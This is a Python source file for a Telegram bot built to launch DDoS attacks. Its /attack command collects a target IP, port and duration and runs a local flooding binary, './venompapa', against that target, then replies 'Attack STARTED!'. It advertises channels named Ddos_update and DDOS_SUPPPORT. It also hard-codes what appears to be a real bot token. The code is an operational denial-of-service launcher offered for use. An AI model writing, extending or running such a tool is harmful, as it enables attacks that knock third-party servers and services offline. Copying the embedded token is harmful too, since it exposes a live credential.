import telebot
import subprocess
import shlex
import threading
import logging
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Configure logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

# Replace these with your actual values
CHANNEL_ID_1 = -1002295014117        # Your first channel ID (as an integer)
CHANNEL_LINK_1 = "https://t.me/Ddos_update"  # Your first channel link
CHANNEL_ID_2 = -1002280231359          # Your second channel ID (as an integer)
CHANNEL_LINK_2 = "https://t.me/DDOS_SUPPPORT" # Your second channel link
OWNER_ID = 1866961136               # Your Telegram User ID

# Global default duration (in seconds)
DEFAULT_DURATION = 60

# Dictionary to temporarily store attack session state (for example, chosen duration)
attack_sessions = {}

# Initialize the bot with your token
bot = telebot.TeleBot("7671643700:AAEkn2cIfBwgQTL90HdZ8UbRw9UJOUeUPjA")

def is_valid_ip(ip: str) -> bool:
    parts = ip.split('.')
    if len(parts) == 4 and all(part.isdigit() for part in parts):
        return all(0 <= int(part) < 256 for part in parts)
    return False

def is_user_member(user_id: int) -> bool:
    """
    Checks if the user is a member of both required channels.
    Returns True only if the user is a member (or admin/creator) in both channels.
    """
    for channel_id in [CHANNEL_ID_1, CHANNEL_ID_2]:
        try:
            member = bot.get_chat_member(channel_id, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                return False
        except Exception as e:
            logger.warning(f"Could not check membership for user {user_id} in channel {channel_id}: {str(e)}")
            return False
    return True

def run_command(command: str, message) -> None:
    """
    Executes the command in a separate thread and sends back the output.
    """
    try:
        result = subprocess.run(shlex.split(command), capture_output=True, text=True)
        if result.returncode == 0:
            reply_text = f"✅ <b>Command executed successfully!</b>\n<pre>{result.stdout}</pre>"
        else:
            reply_text = f"❌ <b>Error executing command:</b>\n<pre>{result.stderr}</pre>"
    except Exception as e:
        reply_text = f"❌ <b>Exception occurred:</b> {str(e)}"
    bot.reply_to(message, reply_text, parse_mode="HTML")

# ------------------------
# Basic Commands
# ------------------------

@bot.message_handler(commands=['start'])
def start(message):
    welcome_text = (
        "Hello!\n\n"
        "Use the command:\n"
        "<code>/attack</code>\n\n"
        "to execute an attack. First, you will confirm the default duration by clicking the inline button, "
        "then you will enter the target IP and port.\n"
        "Make sure you are a member of the required channels."
    )
    bot.reply_to(message, welcome_text, parse_mode="HTML")

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "🤖 <b>Bot Commands</b>\n\n"
        "/start - Start interacting with the bot\n"
        "/attack - Execute an attack command\n"
        "/setduration <duration> - Set the default duration (Owner only)\n"
        "/setdurationmenu [max] - Show preset duration options (Owner only)\n"
        "/ping - Check if the bot is responsive\n"
        "/status - Get current bot/system status\n"
        "/info - Get information about the bot\n"
        "/shutdown - Shut down the bot (Owner only)\n"
    )
    bot.reply_to(message, help_text, parse_mode="HTML")

@bot.message_handler(commands=['ping'])
def ping(message):
    bot.reply_to(message, "🏓 Pong!")

@bot.message_handler(commands=['status'])
def status(message):
    uptime = "Not implemented"  # Optionally, replace with actual uptime info.
    status_text = (
        "📊 <b>Bot Status</b>\n\n"
        f"Uptime: {uptime}\n"
        "All systems operational."
    )
    bot.reply_to(message, status_text, parse_mode="HTML")

@bot.message_handler(commands=['info'])
def info(message):
    info_text = (
        "ℹ️ <b>Bot Information</b>\n\n"
        "Version: 1.0\n"
        "Developed by: YourName\n"
        "This bot is designed to execute specific commands and provide quick responses."
    )
    bot.reply_to(message, info_text, parse_mode="HTML")

@bot.message_handler(commands=['shutdown'])
def shutdown(message):
    user_id = message.from_user.id
    if user_id != OWNER_ID:
        bot.reply_to(message, "🚫 You are not authorized to shut down the bot.")
        return
    bot.reply_to(message, "🔻 Shutting down the bot. Goodbye!")
    bot.stop_polling()

# ------------------------
# Duration-Setting Commands (Owner Only)
# ------------------------

@bot.message_handler(commands=['setduration'])
def set_duration(message):
    """
    Set the global default duration via a command argument.
    Example: /setduration 90
    """
    user_id = message.from_user.id
    if user_id != OWNER_ID:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /setduration <duration>")
        return

    new_duration = args[1]
    if not new_duration.isdigit() or int(new_duration) <= 0:
        bot.reply_to(message, "❌ Duration must be a positive integer.")
        return

    global DEFAULT_DURATION
    DEFAULT_DURATION = int(new_duration)
    bot.reply_to(message, f"✅ Default duration set to {DEFAULT_DURATION} seconds.")

@bot.message_handler(commands=['setdurationmenu'])
def set_duration_menu(message):
    """
    Displays an inline keyboard with preset duration options.
    Optionally, the owner can provide a maximum value.
    Example: /setdurationmenu 60 will show buttons from 1 to 60.
    """
    user_id = message.from_user.id
    if user_id != OWNER_ID:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) == 2 and args[1].isdigit():
        max_duration = int(args[1])
    else:
        max_duration = 60  # Default maximum if not provided

    markup = InlineKeyboardMarkup()
    buttons_per_row = 10
    row_buttons = []
    for i in range(1, max_duration + 1):
        row_buttons.append(InlineKeyboardButton(str(i), callback_data=f"set_duration:{i}"))
        if len(row_buttons) == buttons_per_row:
            markup.row(*row_buttons)
            row_buttons = []
    if row_buttons:
        markup.row(*row_buttons)

    bot.reply_to(message, f"Select a default duration (1 to {max_duration} seconds):", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("set_duration:"))
def callback_set_duration(call):
    """
    Callback handler for the /setdurationmenu inline keyboard.
    """
    user_id = call.from_user.id
    if user_id != OWNER_ID:
        bot.answer_callback_query(call.id, "🚫 You are not authorized to change the default duration.")
        return

    try:
        new_duration = int(call.data.split(":")[1])
    except Exception:
        bot.answer_callback_query(call.id, "❌ Invalid duration.")
        return

    global DEFAULT_DURATION
    DEFAULT_DURATION = new_duration
    bot.answer_callback_query(call.id, f"✅ Default duration set to {DEFAULT_DURATION} seconds.")
    bot.edit_message_text(chat_id=call.message.chat.id,
                          message_id=call.message.message_id,
                          text=f"Default duration set to {DEFAULT_DURATION} seconds.")

# ------------------------
# Attack Flow (Owner Only)
# ------------------------

@bot.message_handler(commands=['attack'])
def attack(message):
    """
    Initiates an attack session.
    Instead of offering a range of duration options, this command shows only one inline button with the fixed default duration.
    """
    user_id = message.from_user.id
    if user_id != OWNER_ID:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return

    if not is_user_member(user_id):
        markup = InlineKeyboardMarkup()
        markup.row(InlineKeyboardButton("Join Channel 1", url=CHANNEL_LINK_1))
        markup.row(InlineKeyboardButton("Join Channel 2", url=CHANNEL_LINK_2))
        bot.reply_to(message,
                     "🚫 You need to be a member of the required channels to use this bot. Please join the channels below:",
                     reply_markup=markup)
        return

    # Create an inline keyboard with only one button (the fixed default duration)
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton(str(DEFAULT_DURATION), callback_data=f"attack_duration:{DEFAULT_DURATION}"))
    bot.reply_to(message,
                 f"Default duration is set to {DEFAULT_DURATION} seconds.\n"
                 "Press the button below to confirm and continue.",
                 reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("attack_duration:"))
def callback_attack_duration(call):
    """
    Callback handler for the inline button in /attack.
    Stores the confirmed duration and prompts for target IP and port.
    """
    user_id = call.from_user.id
    if user_id != OWNER_ID:
        bot.answer_callback_query(call.id, "🚫 You are not authorized to use this command.")
        return

    try:
        chosen_duration = int(call.data.split(":")[1])
    except Exception:
        bot.answer_callback_query(call.id, "❌ Invalid duration.")
        return

    # Save the chosen duration in a temporary attack session
    attack_sessions[user_id] = chosen_duration
    bot.answer_callback_query(call.id, f"✅ Duration confirmed: {chosen_duration} seconds.")
    bot.send_message(call.message.chat.id,
                     "Now, please enter the target IP and port separated by a space (e.g., 192.168.1.10 80).")

@bot.message_handler(func=lambda message: message.from_user.id in attack_sessions)
def attack_ip_port(message):
    """
    After the duration is confirmed, this handler expects the target IP and port.
    It then executes the binary using the chosen duration.
    """
    user_id = message.from_user.id
    chosen_duration = attack_sessions.get(user_id)
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "❌ Usage: <ip> <port>")
        return

    ip, port = args[0], args[1]
    if not is_valid_ip(ip):
        bot.reply_to(message, "❌ Invalid IP address format.")
        return
    if not port.isdigit() or not (1 <= int(port) <= 65535):
        bot.reply_to(message, "❌ Port must be an integer between 1 and 65535.")
        return

    # Build the command that will be executed in the background
    command = f"./venompapa {ip} {port} {chosen_duration}"

    # Enhanced response message without showing the command
    attack_message = (
        f"🚀 <b>Attack STARTED!</b>\n\n"
        f"🌐 <b>IP:</b> {ip}\n"
        f"🔌 <b>PORT:</b> {port}\n"
        f"⏰ <b>TIME:</b> {chosen_duration} seconds"
    )
    bot.reply_to(message, attack_message, parse_mode="HTML")

    # Run the binary in a separate thread
    threading.Thread(target=run_command, args=(command, message), daemon=True).start()

    # Clear the session state for this user
    attack_sessions.pop(user_id, None)

if __name__ == '__main__':
    logger.info("Bot is starting...")
    bot.polling(none_stop=True)